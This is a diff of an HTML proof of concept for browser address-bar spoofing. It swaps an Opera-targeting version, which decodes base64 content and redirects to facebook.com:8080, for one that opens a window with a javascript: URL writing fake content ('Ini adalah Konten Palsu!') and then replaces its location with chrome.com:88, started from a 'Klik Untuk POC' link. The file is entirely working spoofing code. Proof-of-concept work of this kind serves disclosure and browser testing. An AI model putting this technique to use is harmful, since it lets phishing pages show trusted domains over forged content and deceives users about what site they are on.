@@ -1,15 +1,18 @@
 <html>
-<title>Not Opera</title>
-<body>
-<script>
- function spoof()
- {
- var data = 'PGh0bWw+PGJvZHk+PGgxIGFsaWduPSJjZW50ZXIiPlRoaXMgaXMgZGVmaW5pdGVseSBub3QgT3BlcmEuPC9oMT48L2JvZHk+PC9odG1sPg=='; // base64 encoded html content
- document.body.innerHTML=atob(data);
- window.location.assign("https://www.facebook.com:8080");
- }
-setInterval(spoof(),100000);
+ <head>
+  <script>
+  function next() {
+         w.location.replace('https://chrome.com:88');
+        }
+
+  function f() {
+    w = window.open("javascript:document.write('<h1>Ini adalah Konten Palsu!</h1>');location='http://facebook.com'");
+
+    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 0);
+  }
 </script>
-</script>
-</body>
+ </head>
+ <body>
+  <center><a href="#" onclick="f()">Klik Untuk POC</a></center>
+ </body>
 </html>
